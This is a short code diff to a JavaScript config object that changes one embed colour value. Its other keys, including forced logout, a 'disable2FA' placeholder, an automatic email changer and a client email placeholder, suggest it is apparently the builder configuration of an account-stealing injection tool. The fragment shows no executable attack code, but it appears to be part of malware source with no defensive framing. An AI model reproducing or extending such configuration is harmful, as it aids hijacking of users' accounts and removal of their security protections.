@@ -16,7 +16,7 @@ var config = {
   logout: "true",
   "logout-notify": "true",
   "init-notify": "true",
-  "embed-color": 4873727,
+  "embed-color": 3553599,
   disable2FA: "%DISABLEFA%",
   changeMailAuto: "DISABLED!!!",//%AUTOMAILCHANGER%
   mail: "%CLIENTEMAIL%",
